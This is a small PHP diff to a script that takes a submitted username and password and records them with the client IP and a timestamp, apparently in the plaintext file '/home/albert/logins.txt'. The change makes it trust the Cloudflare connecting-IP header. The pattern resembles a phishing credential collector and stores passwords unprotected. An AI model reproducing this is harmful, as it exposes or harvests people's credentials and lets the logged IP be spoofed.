@@ -2,8 +2,8 @@
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = htmlspecialchars($_POST['username']);
     $password = htmlspecialchars($_POST['pswrd']);
-
-    $ip = $_SERVER['REMOTE_ADDR'];
+    
+    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
     $timestamp = date("Y-m-d H:i:s");
 
     $filePath = "/home/albert/logins.txt";
